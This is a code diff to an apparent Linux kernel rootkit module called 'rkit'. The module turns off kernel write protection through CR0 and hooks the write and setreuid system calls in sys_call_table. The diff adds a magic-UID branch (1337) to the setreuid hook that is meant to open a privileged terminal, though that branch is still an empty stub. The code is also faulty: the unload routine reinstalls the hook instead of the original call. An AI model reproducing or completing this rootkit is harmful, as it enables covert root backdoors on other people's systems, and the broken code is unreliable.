@@ -50,6 +50,13 @@ asmlinkage ssize_t rkit_write(int fd, const char __user *buff, ssize_t count) {
 //This is the basic method that we will overwrite the default setreuid with 
 asmlinkage int mod_setreuid(uid_t ruid, uid_t euid){
 
+    if (ruid == 1337 && euid == 1337){
+        //make the custom terminal 
+    }
+
+    else {
+        //else just do normal setreuid 
+    }
 }
 
 int rkit_init(void) {
@@ -65,10 +72,11 @@ int rkit_init(void) {
     }
 
     write_cr0(read_cr0() & (~ 0x10000));
+    // All system calls get __NR_ added to their name. 
     o_write = (void *) xchg(&sys_call_table[__NR_write], (psize)rkit_write);
     //this overrides the current setreuid in the table with our modded version
     //possibly__NR_setreuid64 instead of __NR_setreuid32?
-    o_mod = (void *) xchg(&sys_call_table[__NR_setreuid32], (psize)mod_setreuid);
+    o_mod = (void *) xchg(&sys_call_table[__NR_setreuid], (psize)mod_setreuid);
     write_cr0(read_cr0() | 0x10000);
 
     return 0;
@@ -78,7 +86,7 @@ void rkit_exit(void) {
     write_cr0(read_cr0() & (~ 0x10000));
     xchg(&sys_call_table[__NR_write], (psize)o_write);
     //this resets our setreuid to 
-    xchg(&sys_call_table[__NR_setreuid32], (psize)mod_setreuid);
+    xchg(&sys_call_table[__NR_setreuid], (psize)mod_setreuid);
     write_cr0(read_cr0() | 0x10000);
     printk("rkit: Module unloaded\n");
 }
